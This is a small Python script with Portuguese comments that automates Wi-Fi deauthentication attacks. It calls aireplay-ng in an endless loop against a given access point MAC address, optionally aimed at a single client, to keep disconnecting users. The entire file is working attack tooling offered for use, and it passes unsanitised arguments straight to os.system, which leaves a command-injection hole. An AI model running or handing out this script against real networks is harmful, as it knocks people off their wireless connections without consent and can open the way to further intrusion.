#!/usr/bin/python3
# -*- coding: utf-8 -*-
#deauth automatico de redes com aireplay-ng

import time,sys,os
try:
	if len(sys.argv) < 3 or len(sys.argv) > 4:
		print ("use: python3 deauth.py <MacAdress> <interface> ")
		print ("		OR")
		print ("use: python3 deauth.py <MacAdress> <MacClient> <interface>")
		print ("\nexample: python3 deauth.py 04:8D:39:0D:76:68  A4:33:D7:2A:90:A8 mon0")
		time.sleep(2)
		sys.exit()
	elif len(sys.argv) == 3:
		mac   = sys.argv[1]
		iface = sys.argv[2]
		while True:
			os.system("aireplay-ng -0 5 -a "+mac+" "+iface)
			time.sleep(3)
	else:
		mac    = sys.argv[1]
		iface  = sys.argv[3]
		client = sys.argv[2]
		while True:
			os.system("aireplay-ng -0 5 -a "+mac+" -c "+client+ " "+iface)
			time.sleep(3)
except KeyboardInterrupt:
    #exception ^C
    print("\n\nfim do programa...")
    time.sleep(2)
    sys.exit()	
	
